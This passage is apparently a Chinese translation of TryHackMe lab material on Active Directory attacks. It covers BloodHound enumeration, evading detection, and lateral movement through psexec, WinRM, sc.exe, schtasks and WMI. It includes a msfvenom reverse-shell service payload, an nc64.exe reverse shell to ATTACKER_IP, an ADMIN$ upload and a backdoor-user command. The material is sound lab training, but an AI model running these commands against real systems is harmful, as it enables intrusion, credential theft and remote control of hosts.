class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sharphound.exe --CollectionMethods &lt;Methods&gt; --Domain za.tryhackme.com --ExcludeDCs</span><br></pre></td></tr></table></figure><p>参数解释：</p><ul><li>CollectionMethods - 确定 Sharphound 会收集哪种数据。最常见的选项是 Default 或 All。此外，由于 Sharphound 会缓存信息，因此一旦第一次运行完成，您只能使用 Session 收集方法来检索新用户会话以加快该过程。</li><li>域 - 在这里，我们指定要枚举的域。在某些情况下，您可能希望枚举与现有域具有信任关系的父域或其他域。您可以通过更改此参数来告诉 Sharphound 应该枚举哪个域。</li><li>ExcludeDCs - 这将指示 Sharphound 不要触碰域控制器，从而降低 Sharphound 运行引发警报的可能性。</li></ul><p><a href="https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound-all-flags.html">您可以在此处</a>找到所有各种 Sharphound 参数。最好概览一下其他参数，因为根据您的红队评估情况，可能需要这些参数。</p><p>使用上一个任务中的 SSH PowerShell 会话，将 Sharphound 二进制文件复制到 AD 用户的 Documents 目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; copy C:\Tools\Sharphound.exe ~\Documents\</span><br><span class="line">PS C:\&gt; cd ~\Documents\</span><br><span class="line">PS C:\Users\gordon.stevens\Documents&gt;</span><br></pre></td></tr></table></figure><p>我们将使用 All 和 Session 集合方法运行 Sharphound：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\gordon.stevens\Documents\&gt;SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs</span><br><span class="line">2022-03-16T19:11:41.2898508+00:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote</span><br><span class="line">2022-03-16T19:11:41.3056683+00:00|INFORMATION|Initializing SharpHound at 7:11 PM on 3/16/2022</span><br><span class="line">2022-03-16T19:11:41.6648113+00:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote</span><br><span class="line">2022-03-16T19:11:41.8211318+00:00|INFORMATION|Beginning LDAP search for za.tryhackme.com</span><br><span class="line">[....]</span><br><span class="line">2022-03-16T19:12:31.6981568+00:00|INFORMATION|Output channel closed, waiting for output task to complete</span><br><span class="line">Closing writers</span><br><span class="line">2022-03-16T19:12:32.2605943+00:00|INFORMATION|Status: 2163 objects finished (+2163 43.26)/s -- Using 85 MB RAM</span><br><span class="line">2022-03-16T19:12:32.2605943+00:00|INFORMATION|Enumeration finished in 00:00:50.4369344</span><br><span class="line">2022-03-16T19:12:32.5418517+00:00|INFORMATION|SharpHound Enumeration Completed at 7:12 PM on 3/16/2022! Happy Graphing!</span><br></pre></td></tr></table></figure><p>Sharphound 执行枚举大约需要 1 分钟。在较大的组织中，这可能需要更长的时间，甚至第一次执行需要几个小时。完成后，您将在执行 Sharphound 的同一文件夹中获得一个带时间戳的 ZIP 文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\gordon.stevens\Documents&gt; dir</span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\gordon.stevens\Documents</span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----        3/16/2022   7:12 PM         121027 20220316191229_BloodHound.zip</span><br><span class="line">-a----        3/16/2022   5:19 PM         906752 SharpHound.exe</span><br><span class="line">-a----        3/16/2022   7:12 PM         360355 YzE4MDdkYjAtYjc2MC00OTYyLTk1YTEtYjI0NjhiZmRiOWY1.bin </span><br></pre></td></tr></table></figure><p>我们现在可以使用 Bloodhound 来提取这个 ZIP，以便直观地展示攻击路径。</p><p><strong>Bloodhound</strong></p><p>如前所述，Bloodhound 是一个 GUI，它允许我们导入 Sharphound 捕获的数据并将其可视化到攻击路径中。Bloodhound 使用 Neo4j 作为其后端数据库和图形系统。Neo4j 是一个图形数据库管理系统。</p><p>确保在攻击机器上安装并配置了 Bloodhound 和 neo4j。无论哪种方式，了解后台发生的事情都是有益的。在启动 Bloodhound 之前，我们需要加载 Neo4j：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">thm@thm:~# neo4j console start</span><br><span class="line">Active database: graph.db</span><br><span class="line">Directories in use:</span><br><span class="line">  home:         /var/lib/neo4j</span><br><span class="line">  config:       /etc/neo4j</span><br><span class="line">  logs:         /var/log/neo4j</span><br><span class="line">  plugins:      /var/lib/neo4j/plugins</span><br><span class="line">  import:       /var/lib/neo4j/import</span><br><span class="line">  data:         /var/lib/neo4j/data</span><br><span class="line">  certificates: /var/lib/neo4j/certificates</span><br><span class="line">  run:          /var/run/neo4j</span><br><span class="line">Starting Neo4j.</span><br><span class="line">[....]</span><br><span class="line">2022-03-13 19:59:18.014+0000 INFO  Bolt enabled on 127.0.0.1:7687.</span><br></pre></td></tr></table></figure><p>在另一个终端选项卡中，运行<code>bloodhound --no-sandbox</code>。这将显示身份验证GUI：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/39f261aecedccbaf118eb2ee69d55129.png" alt="猎犬"></p><p>neo4j 数据库的默认凭据为<code>neo4j:neo4j</code>。使用它在 Bloodhound 中进行身份验证。要导入我们的结果，您需要从 Windows 主机恢复 ZIP 文件。最简单的方法是在 AttackBox 上使用 SCP 命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp &lt;AD Username&gt;@THMJMP1.za.tryhackme.com:C:/Users/&lt;AD Username&gt;/Documents/&lt;Sharphound ZIP&gt; .</span><br></pre></td></tr></table></figure><p>提供密码后，结果将复制到您当前的工作目录。将 ZIP 文件拖放到 Bloodhound GUI上以导入 Bloodhound。它将显示正在提取文件并启动导入。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d7bed860790aaca612cc658d19d782ef.png" alt="猎犬"></p><p>一旦导入了所有JSON文件，我们就可以开始使用 Bloodhound 来枚举该特定域的攻击路径。</p><p>Bloodhound 可以显示多种攻击路径。点击“搜索节点”旁边的三个横线将显示选项。第一个选项卡显示了有关当前导入的信息。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/5d695d25afebc2b1dfc7cb408704e755.png" alt="猎犬"></p><p>请注意，如果您导入 Sharphound 的新运行，它将累计增加这些计数。首先，我们将查看节点信息。让我们在 Bloodhound 中搜索我们的AD帐户。您必须单击节点才能刷新视图。另请注意，您可以通过按 LeftCtrl 来更改标签方案。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/a6e1af6f79653eeedb18ac9c3be7a038.png" alt="猎犬"></p><p>我们可以看到，返回了大量有关我们使用的信息。每个类别都提供以下信息：</p><ul><li><strong>概述</strong>- 提供摘要信息，例如帐户拥有的活跃会话数以及是否可以达到高价值目标。</li><li><strong>节点属性</strong>- 显示有关AD帐户的信息，例如显示名称和标题。</li><li><strong>额外属性</strong>- 提供更详细的AD信息，例如可分辨名称和帐户的创建时间。</li><li><strong>群组成员资格</strong>- 显示有关该帐户所属群组的信息。</li><li><strong>本地管理员权限</strong>- 提供有关帐户具有管理权限的加入域的主机的信息。</li><li><strong>执行权限</strong>- 提供有关特殊权限的信息，例如通过RDP进入机器的能力。</li><li><strong>出站控制权限</strong>- 显示有关此帐户有权修改其属性的AD对象的信息。</li><li><strong>入站控制权限</strong>- 提供有关可以修改此帐户属性的AD对象的信息。</li></ul><p>如果您想要了解每个类别的更多信息，可以按信息查询旁边的数字。例如，让我们看看与我们的帐户关联的群组成员身份。通过按“一级群组成员身份”旁边的数字，我们可以看到我们的帐户是两个群组的成员。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/5912fb5bc22f7acfa8bc35f86329f0b4.png" alt="猎犬"></p><p>接下来，我们将查看分析查询。这些查询是 Bloodhound 的创建者自己编写的，用于列举有用的信息。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/247be9dc8f34b8de181516199b0664dd.png" alt="猎犬"></p><p>在域信息部分下，我们可以运行“查找所有域管理员”查询。请注意，您可以按 LeftCtrl 更改标签显示设置。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/9e4a7afd2acd099df71dc70d9eccf705.png" alt="猎犬"></p><p>图标称为节点，线条称为边。让我们深入了解 Bloodhound 向我们展示的内容。有一个AD用户帐户，其用户名为<strong>T0_TINUS.GREEN</strong> ，它是组<strong>Tier 0 ADMINS</strong>的成员。但是，此组是<strong>DOMAIN ADMINS</strong>组的嵌套组，这意味着属于<strong>Tier 0 ADMINS</strong>组的所有用户实际上都是 DA。</p><p>此外，还有一个用户名为<strong>ADMINISTRATOR的</strong>AD帐户，该帐户属于<strong>DOMAIN ADMINS</strong>组。因此，如果我们想获得 DA 权限，我们的攻击面中有两个帐户可以尝试攻陷。由于<strong>ADMINISTRATOR</strong>帐户是内置帐户，因此我们可能会将重点放在用户帐户上。</p><p>前面任务中讨论过的每个AD对象都可以是 Bloodhound 中的一个节点，每个节点都有一个不同的图标来表示其对象类型。如果我们想要制定攻击路径，我们需要查看当前位置和我们拥有的权限与我们想要去的地方之间的可用边。Bloodhound 有各种可用边，可以通过过滤器图标访问：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c21ccdbdd84a6e709d39fdff14764cea.png" alt="猎犬"></p><p>随着新的攻击媒介被发现，这些也在不断更新。我们将在未来的网络中研究如何利用这些不同的边缘。但是，让我们看看仅使用默认边缘和一些特殊边缘的最基本攻击路径。我们将在 Bloodhound 中运行搜索以枚举攻击路径。按路径图标以允许路径搜索。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/d3fab8519fda4ac61db80c35274c53a1.png" alt="猎犬"></p><p>我们的起始节点将是我们的AD用户名，而我们的结束节点将是<strong>第 1 层 ADMINS</strong>组，因为该组对服务器具有管理权限。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/b7ae2e4f8e1824e25e69fa69d95c4a4e.png" alt="猎犬"></p><p>如果使用选定的边缘过滤器没有可用的攻击路径，Bloodhound 将显示“未找到结果”。<strong>请注意，这也可能是由于 Bloodhound/Sharphound 不匹配，这意味着结果未正确提取。请使用 Bloodhound v4.1.0。<strong>但是，在我们的案例中，Bloodhound 显示了一条攻击路径。它显示 T1 ADMINS 之一</strong>ACCOUNT使用其凭据向****THMJMP1</strong> （一个工作站 ）进行身份验证，从而破坏了分层模型。它还显示，任何属于<strong>DOMAIN USERS</strong>组的用户（包括我们的 AD 帐户）都能够通过RDP进入此主机。</p><p>我们可以做如下的事情来利用这条路径：</p><ol><li>使用我们的 AD 凭证通过RDP进入<strong>THMJMP1</strong>。</li><li>在主机上寻找能够为我们提供管理访问权限的权限提升向量。</li><li>利用管理员权限，我们可以使用凭证收集技术和工具，例如 Mimikatz。</li><li>由于 T1 管理员在<strong>THMJMP1</strong>上有一个活动会话，我们的凭证收集将为我们提供关联帐户的NTLM哈希。</li></ol><p>这是一个简单的例子。在正常情况下，攻击路径可能相对复杂，需要采取多项措施才能达到最终目标。如果您对与每个边缘相关的漏洞感兴趣，以下<a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html">Bloodhound 文档</a>提供了一个很好的指南。Bloodhound 是一款功能非常强大的AD枚举工具，可深入了解攻击面的AD结构。值得花点时间试用并学习其各种功能。</p><p><strong>仅限会话数据</strong></p><p>在大型组织中， AD的结构不会经常改变。可能会有几个新员工，但 OU、组、用户和权限的整体结构将保持不变。</p><p>但是，有一件事确实在不断变化，那就是活动会话和登录事件。由于 Sharphound 创建了AD结构的时间点快照，因此活动会话数据并不总是准确的，因为某些用户可能已经注销了他们的会话，或者新用户可能已经建立了新会话。这是需要注意的重要事项，也是我们希望定期执行 Sharphound 的原因。</p><p>一种好方法是在评估开始时使用“全部”收集方法执行 Sharphound，然后每天使用“会话”收集方法至少执行两次 Sharphound。这将为您提供新的会话数据，并确保这些运行速度更快，因为它们不会再次枚举整个AD结构。执行这些会话运行的最佳时间是在 10:00 左右，此时用户喝完第一杯咖啡并开始工作，然后在 14:00 左右再次执行，此时他们午休回来但还没有回家。</p><p>在从这些新的 Sharphound 运行导入数据之前，您可以通过单击数据库信息选项卡上的“清除会话信息”来清除 Bloodhound 中的停滞会话数据。</p><p>好处</p><ul><li>为AD枚举提供GUI。</li><li>能够显示枚举的AD信息的攻击路径。</li><li>对通常需要多次手动查询才能恢复的AD对象提供更深入的见解。</li></ul><p>缺点</p><ul><li>需要执行 Sharphound，它很吵，通常可以被 AV 或EDR解决方案检测到。</li></ul><h4 id="横向移动">横向移动</h4><p>一旦攻击者获得了对网络第一台机器的访问权限，出于多种原因，移动就必不可少，其中包括：</p><ul><li>达到我们作为攻击者的目标</li><li>绕过现有的网络限制</li><li>建立额外的网络入口点</li><li>制造混乱并避免被发现。</li></ul><p>我们使用任何可用的凭据执行横向移动，使我们能够访问新机器，并在可能的情况下提升权限并提取凭据。使用新发现的凭据，循环再次开始。</p><h5 id="远程生成进程">远程生成进程</h5><p>研究攻击者远程生成进程的可用方法，从而使他们在拥有有效凭据的机器上运行命令。讨论的每种技术都使用略有不同的方法来实现相同的目的，其中一些可能更适合某些特定场景。</p><ul><li><strong>Psexec</strong></li><li><strong>端口：</strong> 445/ TCP（SMB）</li><li>**所需组成员身份：**管理员</li></ul><p>Psexec 一直是需要远程执行进程时的首选方法。它允许管理员用户在其有权访问的任何 PC 上远程运行命令。Psexec 是众多 Sysinternals 工具之一，可<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">在此处</a>下载。</p><p>psexec 的工作方式如下：</p><ol><li>连接到 Admin$ 共享并上传服务二进制文件。Psexec 使用 psexesvc.exe 作为名称。</li><li>连接到服务控制管理器以创建并运行名为 PSEXESVC 的服务，并将服务二进制文件与<code>C:\Windows\psexesvc.exe</code>关联。</li><li>创建一些命名管道来处理 stdin/stdout/stderr。</li></ol><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a488102fe0da47a3667961400cf298d8.png" alt="psexec 解释"></p><p>要运行 psexec，我们只需要提供远程主机所需的管理员凭据和我们要运行的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe</span><br></pre></td></tr></table></figure><ul><li><strong>使用 WinRM 创建远程进程</strong></li><li><strong>端口：</strong> 5985/TCP（WinRM HTTP）或 5986/ TCP（WinRM HTTPS）</li><li>**所需组成员身份：**远程管理用户</li></ul><p>Windows 远程管理 (WinRM) 是一种基于 Web 的协议，用于远程向 Windows 主机发送 Powershell 命令。大多数 Windows Server 安装都会默认启用 WinRM，这使其成为一种有吸引力的攻击媒介。</p><p>要从命令行连接到远程 Powershell 会话，我们可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs.exe -u:Administrator -p:Mypass123 -r:target cmd</span><br></pre></td></tr></table></figure><p>我们可以从 Powershell 实现相同的操作，但要传递不同的凭证，我们需要创建一个 PSCredential 对象：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;Administrator&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;Mypass123&#x27;</span>;</span><br><span class="line"><span class="variable">$securePassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="variable">$password</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>; </span><br><span class="line"><span class="variable">$credential</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$username</span>, <span class="variable">$securePassword</span>;</span><br></pre></td></tr></table></figure><p>一旦我们有了 PSCredential 对象，我们就可以使用 Enter-PSSession cmdlet 创建一个交互式会话：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Enter-PSSession</span> <span class="literal">-Computername</span> TARGET <span class="literal">-Credential</span> <span class="variable">$credential</span></span><br></pre></td></tr></table></figure><p>Powershell 还包括 Invoke-Command cmdlet，它通过 WinRM 远程运行 ScriptBlocks。凭据也必须通过 PSCredential 对象传递：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-Computername</span> TARGET <span class="literal">-Credential</span> <span class="variable">$credential</span> <span class="literal">-ScriptBlock</span> &#123;whoami&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>使用 sc远程 创建服务</strong></li><li><strong>端口</strong>：<ul><li>135/ TCP , 49152-65535/ TCP (DCE/RPC)</li><li>445/ TCP（通过SMB命名管道的 RPC）</li><li>139/ TCP（通过SMB命名管道的 RPC）</li></ul></li><li>**所需组成员身份：**管理员</li></ul><p>Windows 服务也可用来运行任意命令，因为它们在启动时会执行命令。虽然服务可执行文件在技术上与常规应用程序不同，但如果我们配置 Windows 服务来运行任何应用程序，它仍会执行该应用程序，然后失败。</p><p>我们可以使用 Windows 中的标准工具 sc.exe 在远程主机上创建服务。使用 sc 时，它将尝试通过以下几种方式通过 RPC 连接到服务控制管理器 (SVCCTL) 远程服务程序：</p><ol><li>将使用 DCE/RPC 进行连接尝试。客户端将首先连接到端口 135 处的端点映射器 (EPM)，该端口用作可用 RPC 端点的目录并请求有关 SVCCTL 服务程序的信息。然后，EPM 将使用 IP 和端口进行响应以连接到 SVCCTL，这通常是 49152-65535 范围内的动态端口。</li><li><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c4f288e73da9c0f4d480ad817b365fe5.png" alt="通过 RPC 进行 svcctl"></li><li>如果后一个连接失败，sc 将尝试通过SMB命名管道访问 SVCCTL ，无论是在端口 445（SMB）还是 139（SMB over NetBIOS）。</li><li><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0c425c37d692c771c944e38dca8c5879.png" alt="通过命名管道进行 svcctl"></li></ol><p>我们可以使用以下命令创建并启动名为“THMservice”的服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe \\TARGET create THMservice binPath= &quot;net user munra Pass123 /add&quot; start= auto</span><br><span class="line">sc.exe \\TARGET start THMservice</span><br></pre></td></tr></table></figure><p>服务启动时将执行“net user”命令，在系统上创建一个新的本地用户。由于操作系统负责启动服务，因此您将无法查看命令输出。</p><p>要停止并删除该服务，我们可以执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe \\TARGET stop THMservice</span><br><span class="line">sc.exe \\TARGET delete THMservice</span><br></pre></td></tr></table></figure><ul><li><strong>远程创建计划任务</strong></li></ul><p>我们可以使用的另一个 Windows 功能是计划任务。您可以使用 schtasks 远程创建和运行计划任务，该功能在任何 Windows 安装中都可用。要创建名为 THMtask1 的任务，我们可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks /s TARGET /RU &quot;SYSTEM&quot; /create /tn &quot;THMtask1&quot; /tr &quot;&lt;command/payload to execute&gt;&quot; /sc ONCE /sd 01/01/1970 /st 00:00 </span><br><span class="line"></span><br><span class="line">schtasks /s TARGET /run /TN &quot;THMtask1&quot; </span><br></pre></td></tr></table></figure><p>我们将计划类型 (/sc) 设置为 ONCE，这意味着该任务只在指定的时间和日期运行一次。由于我们将手动运行该任务，因此开始日期 (/sd) 和开始时间 (/st) 并不重要。</p><p>由于系统将运行计划的任务，因此我们无法获得该命令的输出，这是一种盲目攻击。</p><p>最后，要删除计划任务，我们可以使用以下命令并自行清理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /S TARGET /TN &quot;THMtask1&quot; /DELETE /F</span><br></pre></td></tr></table></figure><blockquote><p>示例</p><p>假设我们已经获取了一些具有管理访问权限的凭据：</p><p><strong>用户：</strong> <a href="http://ZA.TRYHACKME.COM">ZA.TRYHACKME.COM</a>\t1_leonard.summers</p><p><strong>密码：</strong> EZpass4ever</p><p>我们将展示如何使用<code>sc.exe</code>和这些凭据横向移动到 THMIIS ，使用 sc 在远程系统上创建用户（通过使用<code>net user</code>），但我们也可以上传任何我们想要执行的二进制文件并将其与创建的服务关联。但是，如果我们尝试使用此方法运行反向 shell，我们会注意到反向 shell 在执行后立即断开连接。原因是服务可执行文件与标准 .exe 文件不同，因此非服务可执行文件最终会被服务管理器几乎立即终止。幸运的是，msfvenom 支持该<code>exe-service</code>格式，它将把我们喜欢的任何有效载荷封装在功能齐全的服务可执行文件中，从而防止其被终止。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe</span><br></pre></td></tr></table></figure><p>我们将继续使用 t1_leonard.summers 凭证，通过 AttackBox 中的 smbclient 将我们的有效载荷上传到 THMIIS 的 ADMIN$ 共享：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ smbclient -c &#x27;put myservice.exe&#x27; -U t1_leonard.summers -W ZA &#x27;//thmiis.za.tryhackme.com/admin$/&#x27; EZpass4ever</span><br><span class="line">putting file myservice.exe as \myservice.exe (0.0 kb/s) (average 0.0 kb/s)</span><br></pre></td></tr></table></figure><p>一旦我们的可执行文件上传完毕，我们将在攻击者的机器上设置一个监听器来接收来自以下地址的反向 shell <code>msfconsole</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ msfconsole</span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST lateralmovement</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 4444</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/shell/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.16:4444</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit&quot;</span><br></pre></td></tr></table></figure><p>由于<code>sc.exe</code>不允许我们在命令中指定凭据，因此我们需要使用<code>runas</code>来生成具有 t1_leonard.summer 访问令牌的新 shell。不过，我们只能通过SSH访问该机器，因此如果我们尝试类似 的操作<code>runas /netonly /user:ZA\t1_leonard.summers cmd.exe</code>，新的命令提示符将在用户会话中生成，但我们无法访问它。为了解决这个问题，我们可以使用 runas 来生成具有 t1_leonard.summers 访问令牌的第二个反向 shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers &quot;c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443&quot;</span><br></pre></td></tr></table></figure><p>**注意：**请记住，由于您使用的<code>runas</code>是此<code>/netonly</code>选项，因此它不会检查提供的凭据是否有效，因此请确保正确输入密码。如果不这样做，访问被拒绝错误。</p><p>攻击机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ nc -lvp 4443</span><br></pre></td></tr></table></figure><p>最后，使用 sc 继续远程创建一个新服务，并将其与我们上传的二进制文件关联：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= &quot;%windir%\myservice.exe&quot; start= auto</span><br><span class="line">C:\&gt; sc.exe \\thmiis.za.tryhackme.com start THMservice-3249</span><br></pre></td></tr></table></figure><p>请务必更改服务名称，以避免与其他学生发生冲突。</p><p>一旦启动服务，将接收到反向shell</p></blockquote><h5 id="使用wmi横向移动">使用WMI横向移动</h5><p>Windows 管理规范 ( WMI )是基于 Web 的企业管理 (WBEM) 的 Windows 实现， WBEM是跨设备访问管理信息的企业标准。</p><p>简单来说，WMI 允许管理员执行标准管理任务，攻击者可以滥用这些任务以各种方式进行横向移动</p><p><strong>从 Powershell连接到WMI</strong></p><p>在使用 Powershell 命令连接到WMI之前，我们需要使用我们的用户和密码创建一个 PSCredential 对象。此对象将存储在 $credential 变量中，并在本任务的整个过程中使用：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;Administrator&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;Mypass123&#x27;</span>;</span><br><span class="line"><span class="variable">$securePassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="variable">$password</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>;</span><br><span class="line"><span class="variable">$credential</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential <span class="variable">$username</span>, <span class="variable">$securePassword</span>;</span><br></pre></td></tr></table></figure><p>然后，我们使用以下任一协议建立WMI会话：</p><ul><li><strong>DCOM：</strong> 将使用 RPC over IP 连接 WMI。此协议使用端口 135/ TCP和端口 49152-65535/ TCP，正如使用 sc.exe 时所解释的那样。</li><li><strong>Wsman：</strong> WinRM 将用于连接到 WMI。此协议使用端口 5985/TCP（WinRM HTTP）或 5986/ TCP（WinRM HTTPS）。</li></ul><p>要从 Powershell建立WMI会话，我们可以使用以下命令并将会话存储在 $Session 变量中，我们将在整个房间中使用不同的技术：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Opt</span> = <span class="built_in">New-CimSessionOption</span> <span class="literal">-Protocol</span> DCOM</span><br><span class="line"><span class="variable">$Session</span> = <span class="built_in">New-Cimsession</span> <span class="literal">-ComputerName</span> TARGET <span class="literal">-Credential</span> <span class="variable">$credential</span> <span class="literal">-SessionOption</span> <span class="variable">$Opt</span> <span class="literal">-ErrorAction</span> Stop</span><br></pre></td></tr></table></figure><p>该<code>New-CimSessionOption</code>cmdlet 用于配置WMI会话的连接选项，包括连接协议。然后，选项和凭据将传递给该<code>New-CimSession</code>cmdlet，以建立与远程主机的会话。</p><p><strong>使用WMI创建远程进程</strong></p><ul><li>端口：<ul><li>135/ TCP , 49152-65535/ TCP (DCERPC)</li><li>5985/ TCP (WinRM HTTP) 或 5986/ TCP (WinRM HTTPS)</li></ul></li><li>**所需组成员身份：**管理员</li></ul><p>我们可以利用 Windows 管理规范（ WMI）从 Powershell 远程生成一个进程，向 Win32_Process 类发送WMI请求以在我们之前创建的会话下生成该进程：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$Command</span> = <span class="string">&quot;powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere&quot;</span>;</span><br><span class="line"></span><br><span 